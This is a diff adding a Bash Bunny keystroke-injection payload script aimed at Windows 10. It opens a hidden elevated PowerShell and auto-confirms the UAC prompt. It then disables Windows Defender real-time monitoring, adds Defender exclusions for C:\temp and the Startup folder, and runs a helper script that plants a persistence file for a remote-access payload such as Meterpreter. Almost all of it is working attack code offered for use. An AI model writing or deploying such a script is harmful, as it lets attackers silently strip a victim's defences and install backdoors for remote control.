@@ -1,0 +1,44 @@
+# Title:         Windows Defender Disabler Persistence Framework
+# Description:   Creates a file used for persistence of any given payload (NetCat, Meterperter, etc) while stoping windows defender from removeing either files.
+# Author:        Nox (inspriation from 0dyss3us netcat script)
+# Props:         The persistence file is refered to in the code as "TextureManager.vbs" and is required for all persistence functinality. Download here (https://www.mediafire.com/file/iu83ndn2zrn25st/TextureManager.vbs/file)
+#                As for the payload you have to supply your own payload such as meterpreter and some code will have to be filled in.
+#                In the "run.ps1" file there are sections labeled "[PAYLOAD FILE NAME]" replace these with the FULL file name of said payload. Download here (https://www.mediafire.com/file/om74alhh5t0dq9n/run.ps1/file)
+# Version:       1.0
+# Category:      Remote Access
+# Target:        Windows 10
+# Attackmodes:   HID, Storage
+
+#Sets attack mode and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Delays 5 sec incase of slow computer
+Q DELAY 5000
+LED ATTACK
+
+# Disables windows defender
+RUN WIN Powershell -nop -ex Bypass -w Hidden start-process PowerShell -verb runas
+Q DELAY 800
+Q ALT Y
+Q DELAY 500
+Q STRING Set-MpPreference -DisableRealtimeMonitoring \$true
+Q ENTER
+Q DELAY 300
+
+# Makes windows defender exclude file paths
+Q STRING Add-MpPreference -ExclusionPath "C:\temp"
+Q ENTER
+Q DELAY 300
+Q STRING Add-MpPreference -ExclusionPath \("C:\Users" + \$user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"\)
+Q ENTER
+Q DELAY 300
+Q STRING exit
+Q ENTER
+Q DELAY 100
+
+# Runs Powershell script which puts the persistence file in the excluded startup folder and executes it
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+Q DELAY 2000
+LED FINISH
